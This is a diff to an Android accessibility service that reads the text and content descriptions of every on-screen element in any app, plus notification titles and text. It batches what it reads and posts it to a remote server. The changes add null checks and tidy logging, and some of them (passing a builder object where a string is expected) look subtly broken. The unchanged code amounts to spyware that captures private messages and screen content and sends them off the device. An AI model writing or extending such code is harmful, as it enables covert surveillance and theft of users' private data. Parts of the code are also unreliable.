@@ -15,33 +15,31 @@ import org.json.JSONArray;
 import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Comparator;
-import java.util.Date;
 import java.util.HashSet;
 import java.util.List;
-import java.util.Locale;
 import java.util.Set;
 import java.util.concurrent.atomic.AtomicInteger;
 
 public class MyAccessibilityService extends AccessibilityService {
 
     private static final String TAG = "MyAccessibilityService";
-    private static final int BATCH_SIZE = 20; // Updated batch size to 20
+    private static final int BATCH_SIZE = 20;
 
     private final Set<String> loggedNodes = new HashSet<>();
     private final Set<String> tmpNodes = new HashSet<>();
     private final Set<String> loggedPackages = new HashSet<>();
-    private final AtomicInteger sequenceNumber = new AtomicInteger(0);
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         int eventType = event.getEventType();
 
         try {
-            handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString());
+            if (event.getPackageName() != null) {
+                handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString());
+            }
         } catch (Exception e) {
             Log.e(TAG, "Error: " + e.getMessage() + " [" + System.currentTimeMillis() + "]", e);
         }
@@ -50,7 +48,11 @@ public class MyAccessibilityService extends AccessibilityService {
             handleNotificationStateChanged(event);
         } else if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
             // Handle scrolling events
-            new Handler(Looper.getMainLooper()).postDelayed(() -> handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString()), 100);
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                if (event.getPackageName() != null) {
+                    handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString());
+                }
+            }, 100);
         }
     }
 
@@ -60,7 +62,7 @@ public class MyAccessibilityService extends AccessibilityService {
         }
 
         if (!loggedPackages.contains(packageName)) {
-            Log.d(TAG, packageName  );
+            Log.d(TAG, packageName);
             loggedPackages.add(packageName);
         }
 
@@ -71,7 +73,7 @@ public class MyAccessibilityService extends AccessibilityService {
 
         CharSequence nodeText = node.getText();
         CharSequence nodeContentDescription = node.getContentDescription();
-        String className = getClassSimpleName(node.getClassName().toString());
+        String className = getClassSimpleName(node.getClassName() != null ? node.getClassName().toString() : "UnknownClass");
 
         String nodeDescription = packageName + " " + className + " " +
                 (nodeText != null ? nodeText : "") + " " +
@@ -83,9 +85,9 @@ public class MyAccessibilityService extends AccessibilityService {
                     (nodeContentDescription != null ? nodeContentDescription : "") +
                     " " + System.currentTimeMillis();
 
-            Log.d(TAG, sb.toString());
+            Log.d(TAG, sb);
 
-            tmpNodes.add(sb.toString());
+            tmpNodes.add(sb);
 
             if (tmpNodes.size() >= BATCH_SIZE) {
                 sendDatatoServer(new HashSet<>(tmpNodes));
@@ -135,7 +137,7 @@ public class MyAccessibilityService extends AccessibilityService {
 
                 JSONArray jsonArray = new JSONArray(dataList);
 
-                Log.d(TAG, "Sending data: " + jsonArray.toString());
+                Log.d(TAG, "Sending data: " + jsonArray);
 
                 try (OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream())) {
                     writer.write(jsonArray.toString());
@@ -162,22 +164,20 @@ public class MyAccessibilityService extends AccessibilityService {
             Notification notification = (Notification) parcelable;
             CharSequence notificationTitle = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
             CharSequence notificationText = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
-            Log.d(TAG, "Package Name: " + event.getPackageName() );
-            Log.d(TAG, "Notification Title: " + notificationTitle  );
-            Log.d(TAG, "Notification Text: " + notificationText );
+            Log.d(TAG, "Package Name: " + (event.getPackageName() != null ? event.getPackageName().toString() : "Unknown Package"));
+            Log.d(TAG, "Notification Title: " + (notificationTitle != null ? notificationTitle.toString() : "No Title"));
+            Log.d(TAG, "Notification Text: " + (notificationText != null ? notificationText.toString() : "No Text"));
         } else {
             List<CharSequence> notificationText = event.getText();
             if (!notificationText.isEmpty()) {
                 for (CharSequence t : notificationText) {
-                    Log.d(TAG, "Notification Text: " + t.toString() );
+                    Log.d(TAG, "Notification Text: " + (t != null ? t.toString() : "No Text"));
                 }
             } else {
-                Log.d(TAG, "Notification state changed but no text available. ");
+                Log.d(TAG, "Notification state changed but no text available.");
             }
         }
     }
-
-
 
     @Override
     public void onInterrupt() {
